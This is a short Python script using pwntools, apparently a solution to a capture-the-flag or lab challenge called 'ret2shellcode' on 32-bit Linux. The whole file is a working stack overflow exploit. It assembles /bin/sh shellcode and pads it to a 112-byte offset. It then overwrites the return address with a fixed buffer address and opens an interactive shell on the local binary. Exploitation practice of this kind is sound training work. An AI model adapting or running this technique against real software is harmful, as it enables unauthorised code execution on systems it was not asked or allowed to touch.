from pwn import *
context(arch='i386', os='linux')
sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
print(shellcode,len(shellcode))
buf2_addr = 0x804a080

sh.sendline(shellcode + b'A' * (112 - len(shellcode)) +  p32(buf2_addr))
sh.interactive()
